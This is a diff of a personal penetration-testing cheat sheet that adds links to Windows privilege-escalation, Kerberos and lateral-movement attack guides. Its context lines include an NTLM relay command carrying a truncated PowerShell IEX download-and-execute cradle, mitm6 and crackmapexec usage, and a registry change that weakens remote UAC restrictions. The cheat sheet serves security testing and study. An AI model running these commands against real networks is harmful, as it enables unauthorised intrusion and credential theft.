@@ -5,11 +5,15 @@ https://www.ired.team/
 
 https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf
 
+https://0xsp.com/offensive/privilege-escalation-cheatsheet
+
 ## RECON
 
 
 ### SMB
 https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
+
+https://github.com/m8r0wn/nullinux
 
 ```console
 nmblookup -A 192.168.76.40
@@ -216,24 +220,22 @@ impacket-ntlmrelayx  -tf target.txt -smb2support -c "powershell IEX(New-Object N
 mitm6 -d yuncorp.local
 ```
 NTLM
-
 https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds
+
 
 ### AD
 
 https://book.hacktricks.xyz/windows/active-directory-methodology
 
 Kerberos cheatsheet
-
 https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 
+https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
 
 LDAP
-
 https://book.hacktricks.xyz/pentesting/pentesting-ldap
 
 AD
-
 https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
@@ -247,6 +249,8 @@ crackmapexec smb 192.168.100.0/24
 ```
 
 #### Enumerate
+https://www.jonathanmedd.net/wp-content/uploads/2009/10/ADPowerShell_QuickReference.pdf
+
 #Required credentials user
 ```Shell
 cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
@@ -686,3 +690,19 @@ https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.ex
 #### MS16-032 - CVE-2016-0099 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032
 
+
+ 
+ 
+ 
+ 
+ AD
+
+https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/
+
+https://www.hackingarticles.in/abusing-kerberos-using-impacket/
+
+https://www.hackingarticles.in/lateral-movement-pass-the-ccache/https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket
+
+https://www.hackingarticles.in/lateral-movement-pass-the-ticket-attack/
+
+https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/
